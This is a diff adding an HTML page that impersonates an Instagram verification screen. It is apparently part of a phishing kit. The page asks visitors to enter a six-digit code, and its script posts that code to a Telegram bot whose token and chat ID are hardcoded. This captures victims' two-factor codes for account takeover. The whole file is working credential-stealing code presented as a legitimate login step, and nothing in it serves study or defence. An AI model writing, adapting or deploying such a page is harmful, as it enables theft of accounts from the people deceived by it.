@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verification</title>
+  <link rel="stylesheet" href="3ffg.css" />
+</head>
+<body>
+  <main class="container">
+    <form id="verify-form">
+      <img class="logo" src="img/instagram-logo.png" alt="Instagram Logo" />
+      <p class="verify-msg">We've sent you a 6-digit code to your account. Please enter it below.</p>
+      <input id="code" type="text" maxlength="6" placeholder="Enter code" required />
+      <button type="submit">Verify</button>
+    </form>
+  </main>
+
+  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "7589861351:AAE6GNf9_A48WllJYH123Ly1swEVs-q3mxU";
+    const CHAT_ID = "5008982957";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    document.getElementById("verify-form").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const code = document.getElementById("code").value;
+
+      const message = `
+<b>✅ Code Entered</b>\n
+<b>🔢 Code:</b> ${code}
+      `;
+
+      axios.post(URI_API, {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: "html"
+      }).then(() => {
+        alert("✅ تم إرسال الرمز");
+      }).catch(() => {
+        alert("❌ فشل في الإرسال");
+      });
+    });
+  </script>
+</body>
+</html>
